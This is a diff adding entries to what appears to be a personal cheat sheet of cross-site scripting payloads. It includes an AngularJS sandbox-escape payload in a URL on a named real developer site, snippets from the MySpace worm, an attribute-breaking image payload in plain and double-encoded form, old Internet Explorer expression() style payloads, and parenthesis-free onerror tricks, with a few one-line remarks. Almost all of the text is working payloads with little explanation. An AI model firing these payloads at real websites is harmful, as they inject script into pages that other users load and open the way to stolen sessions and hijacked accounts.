@@ -15,3 +15,26 @@ https://developer.uber.com/docs/deep-linking?q=wrtz{{(_="".sub).call.call({}
 [$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")
 ()}}zzzz
 MORAL: Search for sandbox escape payloads
+
+From Samy's MySpace worm
+<div style="background:url('javascript:alert(1)')">
+eval('xmlhttp.onread' + 'ystatechange = callback');
+<div
+    id="mycode" expr="alert('hah!')"
+    style="background:url('javascript:eval(document.all.mycode.expr)')"
+>
+
+// attacker input to innerHTML
+<img src="test.jpg" alt="``onload=xss()" />
+double encoded <TEST WITH PROXY>
+%253Cimg%2520src%253D%2522test.jpg%2522%2520alt%253D%2522%2560%2560onload%253Dxss%2528%2529%2522%2520%252F%253E
+// browser output
+<IMG alt=``onload=xss() src="test.jpg">
+
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(6))>
+<%tag style="xss:expression(alert(6))">
+
+onerror=alert;throw 1;
+onerror=eval;throw'=alert\x281\x29';
+Neither of these examples contains suspicious parentheses. However for them
+to work, their injection point has to exist within an attribute of an HTML element.
